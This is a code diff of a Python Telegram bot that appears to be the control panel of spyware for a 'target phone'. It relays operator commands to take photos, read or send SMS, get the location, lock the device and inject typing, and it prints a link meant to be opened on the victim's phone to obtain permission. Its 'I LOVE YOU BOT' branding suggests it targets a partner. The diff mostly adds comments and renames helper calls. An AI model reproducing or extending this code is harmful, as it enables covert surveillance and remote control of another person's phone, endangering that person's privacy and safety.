@@ -1,25 +1,30 @@
 # telegram_control.py
+
 import os
 from telegram import Bot, Update
 from telegram.ext import Application, CommandHandler, ContextTypes
 from config import BOT_TOKEN, CHAT_ID, PERMISSION_LINK, PERMISSION_GRANTED
 from modules.helper import *
 
+# Initialize bot application
 app = Application.builder().token(BOT_TOKEN).build()
 bot = Bot(token=BOT_TOKEN)
 
+# Permission check function
 def check_permission():
-    if not PERMISSION_GRANTED:
+    if PERMISSION_GRANTED != True:
         print(f"Permission required! Open this link on target phone: {PERMISSION_LINK}")
         return False
     return True
 
+# Start command
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if str(update.effective_chat.id) != CHAT_ID:
         await update.message.reply_text("❌ Unauthorized user.")
         return
     await update.message.reply_text("💖 I LOVE YOU BOT is active! Use /help for commands.")
 
+# Help command
 async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_permission():
         await update.message.reply_text("❌ Permission not granted yet!")
@@ -41,6 +46,7 @@ async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
 """
     await update.message.reply_text(commands)
 
+# Command handlers
 async def photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_permission():
         await update.message.reply_text("❌ Permission not granted yet!")
@@ -75,7 +81,7 @@ async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_permission():
         await update.message.reply_text("❌ Permission not granted yet!")
         return
-    await update.message.reply_text(send_sms_command())
+    await update.message.reply_text(send_sms())
 
 async def location(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_permission():
@@ -87,13 +93,13 @@ async def volume(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_permission():
         await update.message.reply_text("❌ Permission not granted yet!")
         return
-    await update.message.reply_text(control_volume())
+    await update.message.reply_text(adjust_volume())
 
 async def lock(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_permission():
         await update.message.reply_text("❌ Permission not granted yet!")
         return
-    await update.message.reply_text(lock_screen())
+    await update.message.reply_text(lock_device())
 
 async def type_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not check_permission():
